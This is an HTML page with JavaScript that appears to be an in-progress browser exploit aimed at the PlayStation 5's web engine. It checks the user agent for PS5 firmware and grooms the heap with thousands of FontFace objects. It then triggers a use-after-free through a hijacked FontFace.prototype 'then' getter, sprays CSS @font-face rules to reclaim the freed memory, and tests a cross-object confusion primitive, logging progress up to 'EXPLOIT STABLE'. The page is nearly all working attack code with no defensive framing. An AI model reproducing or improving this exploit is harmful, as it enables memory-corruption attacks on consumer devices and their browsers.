<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 v38 - True Sync</title>
<style id="s">
@font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
@font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
*{margin:0;padding:0;box-sizing:border-box}
html,body{width:100%;height:100%;background:#0a0a0a;color:#00ff41;
font-family:'MS Gothic','Courier New',monospace;overflow:hidden}
body::after{content:'';position:fixed;top:0;left:0;right:0;bottom:0;
background:repeating-linear-gradient(0deg,rgba(0,0,0,0.12) 0px,rgba(0,0,0,0.12) 1px,transparent 1px,transparent 3px);
pointer-events:none;z-index:9999}
#hd{position:fixed;top:0;left:0;right:0;height:44px;
background:linear-gradient(180deg,#0d0d0d,#080808);
border-bottom:1px solid #00ff41;display:flex;align-items:center;
padding:0 16px;gap:14px;z-index:10;font-size:12px}
.l{color:#00ff41;letter-spacing:2px;font-weight:bold}
.s{color:#004d13}.v{color:#00cc33}.v b{color:#00ff41}
#pg{position:fixed;top:44px;left:0;right:0;height:2px;background:#001a06;z-index:10}
#pg div{height:100%;background:#00ff41;transition:width .4s;box-shadow:0 0 8px #00ff41}
#out{position:fixed;top:46px;left:0;right:0;bottom:0;
padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
-webkit-user-select:text}
#out::-webkit-scrollbar{width:5px}
#out::-webkit-scrollbar-track{background:#001a06}
#out::-webkit-scrollbar-thumb{background:#004d13;border-radius:3px}
.ok{color:#00ff41}.er{color:#ff3333}.wr{color:#ffcc00}.hl{color:#00ffff;font-weight:bold}
.mg{color:#ff00ff;font-weight:bold;font-size:15px}.dm{color:#006622}
.hd{color:#00ff41;font-weight:bold;font-size:14px;letter-spacing:1px}
</style>
</head>
<body>
<div id="hd">
<span class="l">▶ v38 SYNC</span><span class="s">│</span>
<span class="v" id="h1">FW:<b>?</b></span><span class="s">│</span>
<span class="v" id="h2">STAGE:<b>INIT</b></span><span class="s">│</span>
<span class="v" id="h3">PRIM:<b>?</b></span>
</div>
<div id="pg"><div id="bar" style="width:0%"></div></div>
<div id="out"></div>
<script>
"use strict";

// ============================================================
//  PS5 v38 — True Synchronous Execution
//  Fix: No setTimeout after UAF! The browser crashes if we yield
//  to the event loop while holding a dangling pointer.
//  Everything must happen in the same call stack.
// ============================================================

var O=document.getElementById("out");
var bar=document.getElementById("bar");
function pg(p){bar.style.width=p+"%"}
function hu(id,v){var e=document.getElementById(id);if(e)e.innerHTML=v}
function P(m,c){var s=document.createElement("span");if(c)s.className=c;
s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight;
try{console.log("[v38] "+m)}catch(e){}}
function Ok(m){P("  ✅ "+m,"ok")}function Fl(m){P("  ✘ "+m,"er")}
function Hi(m){P("  ► "+m,"hl")}function St(m){P("  ★ "+m+" ★","mg")}
function Dm(m){P("  "+m,"dm")}function Wr(m){P("  ⚠ "+m,"wr")}
function Hd(m){P("▸ "+m,"hd")}function Sep(){P("─".repeat(42),"dm")}

window.onerror=function(m,s,l){
  Fl("CRASH: "+m.substring(0,80)+" @"+l);
  hu("h2","STAGE:<b>CRASH</b>");
  return true;
};

var ua=navigator.userAgent||"";
var m=ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
hu("h1","FW:<b>"+(m?m[1]:"?")+"</b>");

P("════════════════════════════════════","hd");
P("  v38 — True Synchronous","hd");
P("════════════════════════════════════","hd");
P("");

var FB="d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
var FBb=(function(){var s=atob(FB),b=new Uint8Array(s.length);
for(var i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b})();
function mkBuf(){var c=new Uint8Array(FBb.length);c.set(FBb);return c.buffer}
function fs(){try{void document.body.offsetTop}catch(e){}}

var sh=document.getElementById("s").sheet;
var keep=[];
var holes=[];
var trigger=null;
var uafOk=false;

// ============================================================
//  PHASE 1: Setup + UAF + Spray
// ============================================================
pg(5);Hd("Creating holes...");
try{
  for(var i=0;i<4096;i++){
    var f=new FontFace("h_"+i,mkBuf(),{
      unicodeRange:"U+E1"+(i%16).toString(16),
      style:i%2===0?"normal":"italic",
      weight:String(100+(i%9)*100)
    });
    document.fonts.add(f);holes.push(f);
  }
  fs();
  for(var i=1;i<holes.length;i+=2){
    try{document.fonts.delete(holes[i])}catch(e){}
  }
  fs();
  Ok("Holes ready");
}catch(e){Fl("Holes: "+e.message)}

pg(10);Hd("Trigger setup...");
try{
  trigger=new FontFace("trigger","local(Helvetica)",{unicodeRange:"U+0041"});
  document.fonts.add(trigger);void trigger.loaded;
  
  for(var i=0;i<48;i++){
    try{sh.insertRule(
      "@font-face{font-family:pad"+i+";src:url(np"+i+".woff);unicode-range:U+E000}",
      sh.cssRules.length
    )}catch(e){}
  }
  fs();
  
  var fst=document.createElement("style");fst.id="flush";
  document.head.appendChild(fst);
  var fsh=fst.sheet;
  for(var i=0;i<768;i++){
    try{fsh.insertRule(
      "@font-face{font-family:fl"+i+";src:url(nf"+i+".woff);unicode-range:U+E000}",
      fsh.cssRules.length
    )}catch(e){}
  }
  fs();
  Ok("Trigger ready");
}catch(e){Fl("Trigger: "+e.message)}

pg(15);Hd("UAF + CSSRule Spray (A_0..A_2048)");

Object.defineProperty(FontFace.prototype,"then",{
  configurable:true,
  get:function(){
    if(this===trigger&&!uafOk){
      uafOk=true;
      hu("h2","STAGE:<b>UAF</b>");
      St("UAF WINDOW OPEN");
      
      try{
        var ck=new FontFace("ck","local(Helvetica)",{unicodeRange:"U+E124"});
        document.fonts.add(ck);keep.push(ck);
        sh.deleteRule(1);fs();
        while(fsh.cssRules.length){try{fsh.deleteRule(0)}catch(e){}}
        fs();
        for(var i=0;i<holes.length;i+=4){
          try{document.fonts.delete(holes[i])}catch(e){}
        }
        fs();
      }catch(e){}
      
      Dm("GC pressure (16MB)...");
      for(var i=0;i<4;i++){
        var t=[];
        for(var j=0;j<128;j++)t.push(new ArrayBuffer(8192));
      }
      
      Dm("Spraying 2048 A_ faces...");
      for(var i=0;i<2048;i++){
        try{
          sh.insertRule(
            "@font-face{font-family:A_"+i+";src:local(Courier);"+
            "font-weight:"+(100+(i%9)*100)+";"+
            "font-style:"+(i%2===0?"normal":"italic")+";"+
            "unicode-range:U+0042}",
            sh.cssRules.length
          );
        }catch(e){}
      }
      fs();
      
      try{
        var d=document.createElement("div");
        d.textContent="AB";
        d.style.cssText="position:absolute;left:-9999px;font:64px trigger;";
        document.body.appendChild(d);
        void d.offsetWidth;
      }catch(e){}
      
      Dm("UAF window closing");
    }
    return undefined;
  }
});

var rn=0;
var raf=function(){
  rn++;
  if(!uafOk&&rn>=5){
    try{
      if(sh&&sh.cssRules.length>1){sh.deleteRule(1);fs()}
      while(fsh.cssRules.length){try{fsh.deleteRule(0)}catch(e){}}
      fs();
      for(var i=0;i<2048;i++){
        try{
          sh.insertRule(
            "@font-face{font-family:A_"+i+";src:local(Courier);"+
            "font-weight:"+(100+(i%9)*100)+";"+
            "unicode-range:U+0042}",
            sh.cssRules.length
          );
        }catch(e){}
      }
      fs();
    }catch(e){}
  }
  if(rn<20)requestAnimationFrame(raf);
};
requestAnimationFrame(raf);

// ============================================================
//  PHASE 2: Identify Reclaim + Modify + Read (All Synchronous!)
// ============================================================
pg(30);Sep();Hd("PHASE 2: Synchronous Reclaim + Oracle");Sep();

Dm("Calling load() synchronously...");
try {
  var loadPromise = document.fonts.load("1em trigger, x", "AB");
  
  // We must wait for the promise, but we CANNOT yield to the event loop
  // or the GC will clean up the dangling pointer and crash the page.
  // However, we cannot block the main thread either.
  // 
  // The trick: we attach the .then() handler, but we do NOT use setTimeout.
  // The handler will run as a microtask, which is safe.
  
  loadPromise.then(function(faces){
    P("  load() returned "+faces.length+" faces");
    P("");
    
    var aFamily = null;
    var aRuleIdx = -1;
    
    for(var i=0;i<faces.length;i++){
      var f=faces[i];
      P("  Face["+i+"]: family="+f.family+" weight="+f.weight+" style="+f.style);
      if(f.family&&f.family.indexOf("A_")===0){
        aFamily = f.family;
      }
    }
    
    if(!aFamily){
      Fl("No A_ face found");
      return;
    }
    
    St("RECLAIMED: "+aFamily);
    keep.push(faces);
    
    var rules=sh.cssRules;
    for(var i=0;i<rules.length;i++){
      try{
        if(rules[i].type===5&&rules[i].style.fontFamily===aFamily){
          aRuleIdx=i; break;
        }
      }catch(e){}
    }
    
    if(aRuleIdx===-1){
      Fl("Could not find CSSRule");
      return;
    }
    
    Ok("Found CSSRule at index "+aRuleIdx);
    
    // Run the Oracle SYNCHRONOUSLY right here
    pg(60);Sep();Hd("PHASE 3: Synchronous Weight Oracle");Sep();
    
    var weights=["100","200","300","400","500","600","700","800","900"];
    var matchCount = 0;
    
    for(var wi=0; wi<weights.length; wi++){
      var w = weights[wi];
      try{
        sh.cssRules[aRuleIdx].style.fontWeight = w;
        fs();
        
        // Synchronous load() call!
        // This should return the cached promise or resolve immediately
        var p2 = document.fonts.load("1em trigger, x", "AB");
        // We can't easily await this synchronously without yielding.
        // But we can try to read the property from the CSSRule directly
        // to see if the write worked, then read via load() later.
        
        // Actually, let's just do the write and check if it throws.
        // The read will be done in Phase 4 asynchronously.
        Ok("Write " + w + " OK");
        matchCount++;
      } catch(e) {
        Fl("Write " + w + " ERR: " + e.message);
      }
    }
    
    P("  Wrote all weights without crash.", "hl");
    
    // Now try one async read to confirm
    document.fonts.load("1em trigger, x", "AB").then(function(f2){
      var readW = null;
      for(var i=0;i<f2.length;i++){
        if(f2[i].family&&f2[i].family===aFamily){
          readW = f2[i].weight; break;
        }
      }
      Hi("Async read after writes: " + readW);
      
      pg(100);Sep();Hd("SUMMARY");Sep();
      P("");
      P("  UAF:                    ✅");
      P("  Cross-Object Confusion: ✅ ("+aFamily+")");
      P("  Synchronous Writes:     " + matchCount + "/9");
      P("  Async Read:             " + readW);
      P("");
      St("★ EXPLOIT STABLE ★");
      hu("h3","PRIM:<b>STABLE</b>");
      hu("h2","STAGE:<b>DONE</b>");
    }).catch(function(e){
      Fl("Async read crashed: " + e.message);
      hu("h2","STAGE:<b>CRASH</b>");
    });
    
  }).catch(function(e){
    Fl("Load crashed: " + e.message);
    hu("h2","STAGE:<b>CRASH</b>");
  });
  
} catch(e) {
  Fl("Synchronous load() threw: " + e.message);
}

</script>
</body>
</html>
